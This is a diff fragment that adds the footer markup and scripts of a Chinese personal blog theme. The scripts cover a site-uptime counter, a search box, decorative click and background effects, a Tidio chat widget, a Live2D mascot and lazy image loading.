+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        var t1 = Date.UTC(2019, 08, 10, 00, 00, 00); //北京时间2019-8-1 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+            minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已勉强运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.2.2/masonry.pkgd.min.js"></script>
+        <script src="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdn.bootcss.com/lightgallery/1.6.12/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+            <script src="/libs/others/clicklove.js"></script>
+        
+
+        
+            <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+
+        <!-- 洪卫 shw2018 add 2019.08.28 -->
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "看不见我🙈~看不见我🙈~", clearTimeout(st)) : (document.title =
+                    "(๑•̀ㅂ•́) ✧被发现了～", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果  洪卫 shw2018 add 2019.09.09 -->
+        
+            <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;"></canvas>
+            <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+            <script type="text/javascript" src="/js/fireworks.js"></script>
+        
+
+        <!-- 背景雪花飘落特效洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+            //只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 鼠标点击文字特效 洪卫 shw2018 add 2019.09.10-->
+        
+            <script src="/js/wenzi.js" type="text/javascript"></script>
+        
+
+        <!-- 背景雪花飘落特效 洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+                var windowWidth = $(window).width();
+                if (windowWidth > 768) {
+                    document.write('<script type="text/javascript" src="/js/xuehuapiaoluo.js"><\/script>');
+                }
+            </script>
+        
+
+        <!-- 在线聊天工具  洪卫 shw2018 add 2019.09.11 -->
+        
+            <script src="//code.tidio.co/8ik7q0zvkd62hkjs9ywjidllorug6g7x.js"></script>
+            <!--  在线聊天位置自定义  洪卫 shw2018 add 2019.09.13  -->
+            <script> 
+                $(document).ready(function () {
+
+                    setInterval(change_Tidio, 50);  
+                    function change_Tidio() { 
+
+                        var tidio=$("#tidio-chat iframe");
+                        if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"80px":"20px";   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px";   
+                            document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        } 
+                        else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px"; 
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+                        else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+
+                        if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                            document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                        }
+                    } 
+                }); 
+            </script>
+        
+
+        <!-- 背景 canvas-nest  洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" color="0,0,255" pointColor="0,0,255" opacity= "0.8" zIndex="--1" count="150"src="/libs/background/canvas-nest.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 背景静止彩带  洪卫 shw 2018  add 2019.09.15-->
+        
+
+        <!-- 背景动态彩带 洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" src="/libs/background/ribbon-dynamic.js"><\/script>');
+            }
+            </script>
+        
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+</html>
